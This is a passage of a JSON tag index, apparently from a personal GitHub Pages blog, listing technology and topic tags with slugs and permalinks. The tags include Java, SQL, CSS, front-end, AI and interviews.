ialin996/zhangjialin996.github.io/tags/markdown/"},{"name":"XML","slug":"XML","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/XML/"},{"name":"JDBC","slug":"JDBC","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/JDBC/"},{"name":"前端","slug":"前端","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/%E5%89%8D%E7%AB%AF/"},{"name":"Sql","slug":"Sql","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/Sql/"},{"name":"C语言","slug":"C语言","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/C%E8%AF%AD%E8%A8%80/"},{"name":"jQuery","slug":"jQuery","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/jQuery/"},{"name":"JS","slug":"JS","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/JS/"},{"name":"前端实战","slug":"前端实战","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/%E5%89%8D%E7%AB%AF%E5%AE%9E%E6%88%98/"},{"name":"PthotoShop","slug":"PthotoShop","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/PthotoShop/"},{"name":"CSS","slug":"CSS","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/CSS/"},{"name":"Java","slug":"Java","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/Java/"},{"name":"人工智能","slug":"人工智能","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/"},{"name":"答案","slug":"答案","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/%E7%AD%94%E6%A1%88/"},{"name":"HTML","slug":"HTML","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/HTML/"},{"name":"前后端分离/Spring/Vue","slug":"前后端分离-Spring-Vue","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB-Spring-Vue/"},{"name":"面试","slug":"面试","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/%E9%9D%A2%E8%AF%95/"},{"name":"金融","slug":"金融","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/%E9%87%91%E8%9E%8D/"},{"name":"编辑器","slug":"编辑器","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/%E7%BC%96%E8%BE%91%E5%99%A8/"},{"name":"操作系统","slug":"操作系统","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}]}